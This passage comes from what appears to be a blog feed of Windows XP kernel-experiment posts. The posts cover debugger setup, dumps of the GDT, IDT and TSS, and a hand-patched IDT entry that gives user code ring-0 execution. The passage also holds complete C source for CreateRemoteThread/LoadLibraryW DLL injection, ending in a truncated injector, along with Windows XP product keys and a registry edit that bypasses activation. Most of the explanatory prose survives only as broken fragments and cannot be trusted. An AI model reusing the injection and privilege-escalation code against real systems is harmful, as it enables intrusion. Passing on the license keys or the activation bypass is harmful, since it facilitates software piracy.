ebx:<span class="number">7f</span>fd9000    ecx:b2ede300    edx:<span class="number">7</span>c92eb94    esi:<span class="number">419</span>cf0</span><br><span class="line"> edi:<span class="number">154</span>d58      esp:<span class="number">12f</span>f7c      ebp:<span class="number">12f</span>fc0</span><br><span class="line">eax:<span class="number">401040</span>       ebx:<span class="number">7f</span>fd9000    ecx:b2ede300    edx:<span class="number">7</span>c92eb94    esi:<span class="number">419</span>cf0</span><br><span class="line"> edi:<span class="number">154</span>d58      esp:b2cdfdcc    ebp:<span class="number">12f</span>fc0</span><br><span class="line">cs:<span class="number">1b</span>    ds:<span class="number">23</span>   es:<span class="number">23</span>   fs:<span class="number">3b</span>   gs:<span class="number">0</span>    ss:<span class="number">23</span></span><br><span class="line">cs:<span class="number">8</span>     ds:<span class="number">23</span>   es:<span class="number">23</span>   fs:<span class="number">3b</span>   gs:<span class="number">0</span>    ss:<span class="number">10</span></span><br><span class="line">efalgs0:<span class="number">0x246</span></span><br><span class="line">efalgs0x46</span><br></pre></td></tr></table></figure><p>eflags:0x246&gt;0x46  esp:12ff7c-&gt;b2d13dcc  cs:1b&gt;8 ss:23&gt;10</p><p>1b(0001 1011) &gt; 8(1000)</p><p>23(0010 0011) &gt; 10(0001 0000)</p><h3 id="ds23"><a href="#ds23" class="headerlink" title="ds23?"></a><strong>ds23?</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dg <span class="number">23</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0023</span> <span class="number">00000000</span> ffffffff Data RW Ac <span class="number">3</span> Bg Pg P  Nl <span class="number">00000</span>cf3</span><br></pre></td></tr></table></figure><p>ds4gb</p><h3 id="eflags"><a href="#eflags" class="headerlink" title="eflags?"></a><strong>eflags?</strong></h3><p>0IF</p><h3 id="cs8"><a href="#cs8" class="headerlink" title="cs8"></a><strong>cs8</strong></h3><p><strong></strong> 16-31 0008</p><p>eq 8003f500  0040ee00&#96;00081040</p><p>dg xx</p><h3 id="sssp"><a href="#sssp" class="headerlink" title="sssp"></a><strong>sssp</strong></h3><p>tssTRTSS</p><p>str [g_tr] TSS0x28 3gdt5tss</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528174545899.png" alt="image-20230528174545899"></p><p>TYPEB()1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000+<span class="number">8</span>*<span class="number">5</span> l1</span><br><span class="line"><span class="number">8003f</span>028  <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br></pre></td></tr></table></figure><p>type1011</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528172940147.png" alt="image-20230528172940147"></p><p>TSS(Task state segment)</p><p></p><p></p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528175556760.png" alt="image-20230528175556760"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">WORD g_tr;</span><br><span class="line">DWORD g_80042004, g_80042008;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov[g_esp], esp</span><br><span class="line">        mov[g_ss], ss</span><br><span class="line">        mov eax, ds:[<span class="number">0x80042004</span>]</span><br><span class="line">        mov[g_80042004], eax</span><br><span class="line">        mov eax, ds:[<span class="number">0x80042008</span>]</span><br><span class="line">        mov[g_80042008],eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%x\tss: 0x%x\n&quot;</span>, g_esp[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp0: 0x%x\tss0: 0x%hx&quot;</span>,g_80042004,g_80042008);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">esp:  <span class="number">0xb29d3dcc</span>         ss: <span class="number">0x10</span></span><br><span class="line">esp0: <span class="number">0xb29d3de0</span>        ss0: <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>tss</p><h3 id="esp0x145"><a href="#esp0x145" class="headerlink" title="esp0x145"></a><strong>esp0x145</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">DWORD g_eflags;</span><br><span class="line">DWORD g_stack[<span class="number">5</span>];</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, dword ptr ss:[esp]</span><br><span class="line">        mov dword ptr [g_stack], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">4</span>]</span><br><span class="line">        mov dword ptr [g_stack + <span class="number">4</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">8</span>]</span><br><span class="line">        mov dword ptr [g_stack + <span class="number">8</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">12</span>]</span><br><span class="line">        mov dword ptr [g_stack +<span class="number">12</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">16</span>]</span><br><span class="line">        mov dword ptr [g_stack+<span class="number">16</span>], eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop [g_eflags]</span><br><span class="line">        mov [g_ss],ss</span><br><span class="line">        mov [g_esp],esp</span><br><span class="line">        mov [g_cs],cs</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs: 0x%x\teflags: 0x%hx\t&quot;</span>,g_cs[<span class="number">0</span>],g_eflags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%x\tss: 0x%x\n&quot;</span>, g_esp[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;stack[%d]:0x%x\n&quot;</span>,i,g_stack[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs: <span class="number">0x1b</span>        eflags: <span class="number">0x246</span>   esp: <span class="number">0x12ff78</span>   ss: <span class="number">0x23</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">0</span>]:<span class="number">0x4010aa</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">1</span>]:<span class="number">0x1b</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">2</span>]:<span class="number">0x246</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">3</span>]:<span class="number">0x12ff78</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">4</span>]:<span class="number">0x23</span></span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><p>cs eflags esp ss()iret</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528225918572.png" alt="image-20230528225918572"></p><blockquote><p>?</p><p>IdtEntryint3 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span></span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        pop eax</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int3</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">00401040 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r esp</span></span><br><span class="line">esp=b2cf3dcc</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dps b2cf3dcc l5</span></span><br><span class="line">b2cf3dcc  00401061</span><br><span class="line">b2cf3dd0  0000001b</span><br><span class="line">b2cf3dd4  00000246</span><br><span class="line">b2cf3dd8  0012ff78</span><br><span class="line">b2cf3ddc  00000023</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">ub 00401061 l4</span></span><br><span class="line">0040105b 756d            jne     004010ca</span><br><span class="line">0040105d 50              push    eax</span><br><span class="line">0040105e 58              pop     eax</span><br><span class="line">0040105f cd20            int     20h</span><br></pre></td></tr></table></figure><p>int  20h</p></blockquote><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230527235756049.png" alt="image-20230527235756049"></p><p>csssRPL(CPL)0</p><p>windbg</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r gdtr</span></span><br><span class="line">gdtr=8003f000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r gdtl</span></span><br><span class="line">gdtl=000003ff</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq 8003f000 l20</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">8003f010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">8003f020  00cff300`0000ffff 80008b04`200020ab</span><br><span class="line">8003f030  ffc093df`f0000001 0040f300`00000fff</span><br><span class="line">8003f040  0000f200`0400ffff 00000000`00000000</span><br><span class="line">8003f050  80008955`17000068 80008955`17680068</span><br><span class="line">8003f060  00009302`2f30ffff 0000920b`80003fff</span><br><span class="line">8003f070  ff0092ff`700003ff 80009a40`0000ffff</span><br><span class="line">8003f080  80009240`0000ffff 00009200`00000000</span><br><span class="line">8003f090  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0a0  8200891e`a9400068 00000000`00000000</span><br><span class="line">8003f0b0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0c0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0d0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0e0  f8009f71`a000ffff 00009200`0000ffff</span><br><span class="line">8003f0f0  8000984f`ccd403b7 00009200`0000ffff</span><br></pre></td></tr></table></figure><blockquote><p>GDT0</p></blockquote><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528001616020.png" alt="image-20230528001616020"></p><p></p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528001515527.png" alt="image-20230528001515527"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:(Interrupt Privilege Escalation)</title>
      <link href="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/"/>
      <url>/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows--Interrupt-Privilege-Escalation"><a href="#Windows--Interrupt-Privilege-Escalation" class="headerlink" title="Windows:(Interrupt Privilege Escalation)"></a>Windows:(Interrupt Privilege Escalation)</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>32xp64</p><p>Windows XP Home Edition with Service Pack 2 (Simplified Chinese) </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ed2k:<span class="comment">//|file|sc_winxp_home_with_sp2.iso|61135872    0|B80F4CCF312420015FFD5740057085B0|/</span></span><br></pre></td></tr></table></figure><p>Home Edition with Service Pack 2  xp </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>QKF3-VDWXY-CT6TM<span class="number">-7</span>TGG6-GKR9G</span><br></pre></td></tr></table></figure><p>Windows XP Professional with Service Pack 2 (Simplified Chinese</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BB96V<span class="number">-433</span>XK-GM9WR-KXCDJ<span class="number">-4</span>HTQW</span><br></pre></td></tr></table></figure><p>zh-hans_windows_xp_professional_with_service_pack_3_x86_cd</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HCTWB-DHDVJ-GMJP7<span class="number">-3</span>T97V<span class="number">-72</span>QRQ </span><br></pre></td></tr></table></figure><blockquote><p> sp3windbg</p></blockquote><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>regedit  </span><br><span class="line"><span class="number">2</span> Hkey_Local_Machine\Software\Microsoft\WindowsNT\CurrentVersion\WPAEvents\</span><br><span class="line"><span class="number">3</span> lastWPAEventLoged </span><br><span class="line"><span class="number">4</span> OOBETimer ff d5 <span class="number">71</span> d6 <span class="number">8b</span> <span class="number">6</span>a <span class="number">8</span>d <span class="number">6f</span> d5 <span class="number">33</span> <span class="number">93</span> fd </span><br><span class="line"><span class="number">5</span>WPAEvents</span><br><span class="line"><span class="number">6</span>system  </span><br></pre></td></tr></table></figure><p>com_2</p><blockquote><p>com_1</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\\.\pipe\com_2</span><br></pre></td></tr></table></figure><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526010718133.png" alt="image-20230526010718133"></p><p>boot.ini </p><blockquote><p>COM11(22)</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526140611903.png" alt="image-20230526140611903"></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p> msconfig </p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526140205585.png" alt="image-20230526140205585"></p><p>windbg</p><blockquote><p>\.\pipe\com_2</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;D:\Windows Kits\10\Debuggers\x64\windbg.exe&quot;</span> -b -k com:pipe,port=\\.\pipe\com_2,baud=<span class="number">115200</span>,resets=<span class="number">0</span> -y SRV*E:\WindbgSybols*https:<span class="comment">//msdl.microsoft.com/download/symbols</span></span><br></pre></td></tr></table></figure><p>**<code>GRMWDK_EN_7600_1.ISO</code>**windbg7600 (xpbug)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>https:<span class="comment">//www.microsoft.com/en-us/download/confirmation.aspx?id=11800</span></span><br><span class="line"><span class="number">2.</span>https:<span class="comment">//download.microsoft.com/download/4/A/2/4A25C7D5-EFBE-4182-B6A9-AE6850409A78/GRMWDK_EN_7600_1.ISO</span></span><br></pre></td></tr></table></figure><p>xuetr</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">http://www.xuetr.com/</span><br></pre></td></tr></table></figure><p>vs2022xp()</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526200219936.png" alt="image-20230526200219936"></p><p>vs2022</p><p>c&#x2F;c++<img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230531145420975.png" alt="image-20230531145420975"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>ia32</p><p><a href="https://grxer.github.io/2023/04/08/32bit-x86-protected-mode/">https://grxer.github.io/2023/04/08/32bit-x86-protected-mode/</a></p><p><a href="https://grxer.github.io/2023/04/22/IA32-Interrupt-Exception/">https://grxer.github.io/2023/04/22/IA32-Interrupt-Exception/</a></p><p>0</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526222003641.png" alt="image-20230526222003641"></p><p>windbg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=<span class="number">8003f</span>400</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>400</span><br><span class="line"><span class="number">8003f</span>400  <span class="number">80548e00</span>`<span class="number">00082190</span> <span class="number">80548e00</span>`<span class="number">0008230</span>c</span><br><span class="line"><span class="number">8003f</span>410  <span class="number">00008500</span>`<span class="number">0058112</span>e <span class="number">8054</span>ee00`<span class="number">00082720</span></span><br><span class="line"><span class="number">8003f</span>420  <span class="number">8054</span>ee00`<span class="number">000828</span>a0 <span class="number">80548e00</span>`<span class="number">00082</span>a00</span><br><span class="line"><span class="number">8003f</span>430  <span class="number">80548e00</span>`<span class="number">00082b</span>74 <span class="number">80548e00</span>`<span class="number">000831</span>ec</span><br><span class="line"><span class="number">8003f</span>440  <span class="number">00008500</span>`<span class="number">00501188</span> <span class="number">80548e00</span>`<span class="number">000835f</span>0</span><br><span class="line"><span class="number">8003f</span>450  <span class="number">80548e00</span>`<span class="number">00083710</span> <span class="number">80548e00</span>`<span class="number">00083850</span></span><br></pre></td></tr></table></figure><blockquote><p>dbg r idtr32</p><p>r idtl</p></blockquote><p></p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526221657750.png" alt="image-20230526221657750"></p><p>00 </p><p>8003f400<code>80548e00 00082190</code>48-648054 + 0-152190 &#x3D; 0x80542190</p><p>2020hook</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_tmp;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        mov eax,dword ptr ds:[<span class="number">0x8003f500</span>]</span><br><span class="line">        mov g_tmp,eax</span><br><span class="line">        pop eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,g_tmp);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>dbg</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eq <span class="number">8003f</span>500  <span class="number">0040</span>ee00`<span class="number">00081040</span></span><br></pre></td></tr></table></figure><blockquote><p>DPLDPL(11)</p><p>03int 20</p></blockquote><ol start="2"><li><p>ce( )</p><p> </p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230527002007814.png" alt="image-20230527002007814"></p></li></ol><p>IdtEntry0</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dll(Dynamic DLL Injection And Unloading)</title>
      <link href="/2023/05/25/Dynamic-DLL-Injection-and-unloading/"/>
      <url>/2023/05/25/Dynamic-DLL-Injection-and-unloading/</url>
      
        <content type="html"><![CDATA[<h1 id="Dynamic-DLL-Injection-And-Unloading"><a href="#Dynamic-DLL-Injection-And-Unloading" class="headerlink" title="Dynamic DLL Injection And Unloading"></a>Dynamic DLL Injection And Unloading</h1><p>()bug</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><p>OpenProcess id</p></li><li><p>VirtualAllocEx </p></li><li><p>WriteProcessMemory dll</p></li><li><p>GetModuleHandle kernel32.dll</p><blockquote><p>kernel32.dll user32.dll gdi32.dll advapi32.dll shell32.dll(32326464)windows dll((xp sp3),,<del></del>)</p><p>aslr</p><p>linuxwindows</p></blockquote></li><li><p>GetProcAddresskernel32LoadLibraryW</p></li><li><p>CreateRemoteThreadLoadLibraryWDllMain</p></li></ul><p>hack.dll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp :  DLL </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line">HMODULE g_hMod;</span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span> &#123;</span><br><span class="line">    TCHAR Path[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!GetModuleFileName(g_hMod, Path, MAX_PATH))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>,<span class="string">L&quot;grxer&quot;</span>,Path,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    g_hMod = hModule;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;hack.dll injection\n&quot;</span>);</span><br><span class="line">        HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inject.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">Inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> &#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;open fail %d&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    _tprintf(<span class="string">L&quot;%p&quot;</span>, pRemoteBuf);</span><br><span class="line">    <span class="keyword">if</span> (pRemoteBuf == <span class="number">0</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;%d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        _tprintf(<span 